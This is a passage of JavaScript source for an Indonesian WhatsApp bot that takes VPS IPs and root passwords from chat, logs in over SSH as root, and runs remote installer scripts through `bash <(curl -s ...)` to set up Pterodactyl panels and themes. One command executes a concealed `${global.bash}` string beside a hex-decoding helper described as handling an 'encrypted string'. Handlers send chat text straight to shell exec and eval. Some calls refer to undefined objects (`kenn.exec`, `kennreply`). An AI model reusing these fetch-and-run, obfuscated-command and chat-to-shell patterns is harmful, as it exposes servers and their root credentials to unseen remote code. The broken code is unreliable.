        console.log("✅ [PANEL] Install panel selesai, lanjut wings...");
        instalWings();
      });
    });
  } catch (e) {
    syahreply(e.message);
  }
}

// ======================= SSH READY =======================

ress.on('ready', async () => {
  try {
    await syahreply("Memproses *install panel* \nTunggu 5 menit ke depan hingga proses selesai");

    ress.exec(deletemysql, (err, stream) => {
      if (err) {
        console.error("❌ Error deletemysql:", err);
        return syahreply(`❌ ${err.message}`);
      }

      stream.on('close', () => {
        instalPanel();
      });

      stream.on('data', (data) => {
        console.log("Logger:", data.toString());
      });

      stream.stderr.on('data', (data) => {
        console.error("STDERR:", data.toString());
      });
    });

  } catch (error) {
    console.error("❌ SSH READY ERROR:", error);
    return syahreply(error.message);
  }
});

// ======================= CONNECT =======================

try {
  ress.connect(connSettings);
} catch (error) {
  console.error("❌ Gagal menghubungkan ke server:", error);
  syahreply(`❌ ${error.message}`);
}

}
break;
       
        
case "startwings": 
case "configurewings": {
    if (!isCreator) return syahreply(mess.owner);

    let t = text.split('|');
    if (t.length < 3) return syahreply(example("ipvps|pwvps|token_node"));

    let ipvps = t[0].trim();
    let passwd = t[1].trim();
    let token = t[2].trim();

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `${token} && systemctl start wings`;
    const ress = new Client();

    ress.on('ready', () => {
        ress.exec(command, (err, stream) => {
            if (err) throw err;

            stream.on('close', async (code, signal) => {    
                await syahreply("*Berhasil menjalankan wings ✅*\nSilahkan cek panel anda 😋");
                ress.end();
            }).on('data', async (data) => {
                await console.log(data.toString());
            }).stderr.on('data', (data) => {
                stream.write("y\n");
                stream.write("systemctl start wings\n");
                syahreply('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Kata sandi atau IP tidak valid');
    }).connect(connSettings);
}
break;        
        
case "uninstallpanel": {
    if (!isCreator) return;
    if (!text || !text.includes("|")) return syahreply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return syahreply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://pterodactyl-installer.se)`;
    const ress = new Client();

    ress.on('ready', async () => {
        await syahreply("Memproses *uninstall panel*\nTunggu 1 menit ke depan hingga proses selesai...");

        ress.exec(command, async (err, stream) => {
            if (err) throw err;

            stream.on('close', async () => {
                await syahreply("Berhasil *uninstall panel* ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());

                if (data.toString().includes(`Input 0-6`)) stream.write("6\n");
                if (data.toString().includes(`(y/N)`)) stream.write("y\n");
                if (data.toString().includes(`* Choose the panel user (to skip don't input anything):`)) stream.write("\n");
                if (data.toString().includes(`* Choose the panel database (to skip don't input anything):`)) stream.write("\n");
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
                syahreply('Terjadi kesalahan saat proses uninstall panel.');
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;      
        
case "uninstalltema": {
    if (!isCreator) return syahreply(mess.owner);
    if (!text || !text.includes("|")) return syahreply(example("ipvps|pwvps"));
    
    const [ipvps, pwvps] = text.split("|").map(v => v.trim());
    if (!ipvps || !pwvps) return syahreply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps.trim(),
        port: '22',
        username: 'root',
        password: pwvps.trim()
    };
    
    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    try {
        await syahreply("Memproses *uninstall* tema pterodactyl\nTunggu 3 menit ke depan hingga proses selesai");

        ress.on('ready', () => {
            ress.exec(command, (err, stream) => {
                if (err) {
                    console.error("❌ Kesalahan saat menjalankan perintah:", err);
                    return syahreply("Terjadi kesalahan saat mengeksekusi perintah.");
                }
                
                stream.on('close', async (code, signal) => {    
                    await syahreply("✅ Berhasil *uninstall* tema pterodactyl");
                    ress.end();
                }).on('data', async (data) => {
                    console.log(data.toString());
                    stream.write(`2\n`);
                    stream.write(`y\n`);
                    stream.write(`x\n`);
                }).stderr.on('data', (data) => {
                    console.error("❌ STDERR:", data.toString());
                });
            });
        }).on('error', (err) => {
            console.error("❌ Kesalahan Koneksi:", err);
            syahreply("❌ Gagal terhubung ke VPS. Periksa IP dan kata sandi.");
        }).connect(connSettings);
    } catch (error) {
        console.error("❌ Terjadi Kesalahan:", error);
        syahreply("❌ Terjadi kesalahan yang tidak terduga.");
    }
}
break;        
        
case 'installtemastellar': {
    if (!isCreator) return syahreply(mess.owner)
    
    let t = text.split('|');
    if (t.length < 2) return syahreply(`*Format salah!*\nPenggunaan: ${prefix}installtheme ipvps|password`)
    
    let ipvps = t[0];
    let passwd = t[1];
    
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    // Fungsi untuk mendekode representasi byte kembali ke string asli
    function rafa(opece) {
        return opece.split('\\x').slice(1).map(byte => String.fromCharCode(parseInt(byte, 16))).join('');
    }

    // Gunakan string terenkripsi di kode Anda
    const command = `${global.bash}`

    const syah = new Client();
    let isSuccess = false; // Flag untuk menentukan keberhasilan koneksi

    syah.on('ready', () => {
        isSuccess = true; // Set flag menjadi true jika koneksi berhasil
        syahreply('*PROSES INSTALL THEME DIMULAI MOHON TUNGGU 5-10 MENIT KEDEPAN*');
        
        kenn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Stream closed with code ' + code + ' and signal ' + signal);
                syahreply('`SUKSES INSTALL THEME PANEL ANDA, SILAHKAN CEK`')
                syah.end();
            }).on('data', (data) => {
                stream.write(`${global.tokeninstall}\n`);
                stream.write('1\n');
                stream.write('1\n');
                stream.write('y\n');
                stream.write('x\n');
                
                console.log('STDOUT: ' + data);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid');
    }).connect(connSettings);
   
   setTimeout(() => {
        if (isSuccess) {
            syahreply('DONE GA BANG??');
        }
    }, 300000); // 180000 ms = 3 menit
   
}
break

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installtemabilling": 
case "instaltemabiling": {
    if (!isCreator && !isPremium) return syahreply(mess.premium)
    if (!text || !text.includes("|")) return kennreply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return syahreply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        syahreply("Memproses install *tema billing* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await syahreply("Berhasil install *tema billing* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`1\n`);
                stream.write(`2\n`);
                stream.write(`yes\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installtemaenigma": 
case "instaltemaenigma": {
    if (!isCreator && !isPremium) return syahreply(mess.premium)
    if (!text || !text.includes("|")) return syahreply(example("ipvps|pwvps|linkwa|linkgc1|linkgc2|linkch\n\nNote:\nFormat linkwa harus https://wa.me/62xx"));

    const [ipvps, passwd, linkwa, linkgc1, linkgc2, linkch] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd || !linkwa || !linkgc1 || !linkgc2 || !linkch) 
        return syahreply(example("ipvps|pwvps|linkwa|linkgc1|linkgc2|linkch\n\nNote:\nFormat linkwa harus https://wa.me/62xx"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        syahreply("Memproses install *tema enigma* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await syahreply("Berhasil install *tema enigma* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write('1\n');
                stream.write('3\n');
                stream.write(`${linkwa}\n`);
                stream.write(`${linkgc1}\n`);
                stream.write(`${linkgc2}\n`);
                stream.write(`${linkch}\n`);
                stream.write('yes\n');
                stream.write('x\n');
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installtemaelysium": 
case "instaltemaelysium": {
    if (!isCreator && !isPremium) return syahreply(mess.premium)
    if (!text || !text.includes("|")) return syahreply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return syahreply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        syahreply("Memproses install *tema elysium* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await syahreply("Berhasil install *tema elysium* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`11\n`);
                stream.write(`yes\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installdepend": {
    if (!isCreator && !isPremium) return syahreply(mess.premium)
    if (!text || !text.includes("|")) return kennreply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return syahreply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`
    const ress = new Client();

    ress.on('ready', async () => {
        syahreply("Memproses install *depend* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                const buttonsMessage = {
                    text: `Berhasil install *depend* pterodactyl ✅\nKlik Tombol Di Bawah Untuk Install Tema Nebula.`,
                    footer: `*${botname}*`,
                    buttons: [
                        { buttonId: `${prefix}installtemanebula ${text}`, buttonText: { displayText: 'Install Tema Nebula' }, type: 1 }
                    ],
                    headerType: 1,
                    viewOnce: true,
                    contextInfo: {
                        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
                    }
                };

                await syah.sendMessage(m.chat, buttonsMessage, { quoted: m });
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`9\n`);
                stream.write(`A\n`);
                stream.write(`Y\n`);
                stream.write(`Y\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        kennreply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installtemanebula": 
case "instaltemanebula": {
    if (!isCreator && !isPremium) return syahreply(mess.premium)
    if (!text || !text.includes("|")) return kennreply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return syahreply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        syahreply("Memproses install *tema nebula* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await syahreply("Berhasil install *tema nebula* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`10\n`);
                stream.write(`\n`);
                stream.write(`\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

case "installtemanightcore": 
case "instaltemanightcore": {
    if (!isCreator && !isPremium) return syahreply(mess.premium)
    if (!text || !text.includes("|")) return syahreply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return syahreply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        syahreply("Memproses install *tema Nightcore* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await syahreply("Berhasil install *tema Nightcore* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                // pilih opsi 12 (Nightcore)
                stream.write(`12\n`);
                stream.write(`yes\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        syahreply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

        
case "public": 
case "self": {
    if (!isCreator) return;
    if (command === "public") {
        syah.public = true;
        await syahreply("✅ *Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Public*.");
    } else if (command === "self") {
        syah.public = false;
        await syahreply("✅ *Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Self*.");
    }
}
break;        
        
// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

default:
if ((m.text).startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if(err) return syah.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return syah.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith("=>")) {
if (!isCreator) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return syah.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return syah.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith(">")) {
if (!isCreator) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
syah.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
syah.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (e) {
console.log(e)
syah.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})